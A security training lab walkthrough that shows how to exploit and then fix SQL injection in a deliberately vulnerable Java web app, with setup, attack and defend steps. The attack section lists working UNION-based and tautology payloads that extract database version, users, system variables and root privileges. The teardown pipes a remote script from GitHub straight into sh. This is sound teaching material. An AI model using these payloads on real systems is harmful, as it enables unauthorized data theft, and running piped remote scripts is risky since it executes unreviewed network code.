Attack

Step 1: Open a new terminal and access directory
cd /root/sql-injectionCopy
Step 2: Build the project
mvn packageCopy
Step 3: Now start the app
docker-compose up -dCopy
| Wait for the app to get deployed

Note: If the startup is stuck at JAR scanning, bring down the server and spin up a new one

Step 4: In the browser, access http://<server-ip>:8888/SQLInjection/insecure
Substitute your server-ip here for the placeholder <server-ip>

Note: To fetch server ip type in serverip in a new terminal

Step 5: Create some dummy users

Step 6: In the search bar search for any user you have created based on first name

Step 7: Now test for SQL Injection payload

' or '1=1Copy
| This should return all the users you have created

Step 8: You can also try with these payloads

To get mysql version

a' UNION ALL SELECT null,version(),null,null'Copy
You will see a mysql version under the header First Name

To get the logged in mysql user

a' UNION ALL SELECT null,CURRENT_USER(),null,null'Copy
You will see the current mysql user under the header First Name

To get the current database

a' UNION ALL SELECT null,DATABASE(),null,null'Copy
You will see the database name under the header First Name

Now try other attacks (Each line is one payload)

a' UNION ALL SELECT null,system_user(),null,null'
a' UNION ALL SELECT null,@@GLOBAL.innodb_data_file_path,null,null'
a' UNION ALL SELECT null,@@GLOBAL.bind_address,null,null'
a' UNION ALL SELECT null,@@GLOBAL.version_compile_os,null,null'
a' UNION ALL SELECT null,@@GLOBAL.version_compile_machine,null,null'
a' UNION ALL SELECT null,@@GLOBAL.tls_version,null,null'
a' UNION ALL SELECT null,@@GLOBAL.block_encryption_mode,null,null'
a' UNION ALL SELECT null,@@GLOBAL.default_authentication_plugin,null,null'
a' UNION ALL SELECT null,@@GLOBAL.hostname,null,null'
a' UNION ALL SELECT null,@@GLOBAL.secure_file_priv,null,null'
a' UNION ALL SELECT null,@@GLOBAL.hostname,@@GLOBAL.bind_address,CURRENT_USER()'
a' or '1=1
test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x717a626a71),NULL-- YgfE
test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x717a626a71),NULL-- SSaoCopy
Defend
Step 1: On the browser, access http://<server-ip>:8888/SQLInjection/secure
Substitute your server-ip here for the placeholder <server-ip>

Step 2: In the search bar search for any user you have created based on first name

Step 3: Now test for SQL Injection payload

' or '1=1Copy
This should not return any value

Here the fix is a PreparedStatement query from line numbers 87 to 90 in the file /root/sql-injection/src/main/java/we45/training/labs/Secure.java

Teardown
Step 1: Change to directory
cd /root/sql-injectionCopy
Step 2: Stop the app
curl -sSL https://raw.githubusercontent.com/we45/xml-files/master/clean-docker.sh | shCopy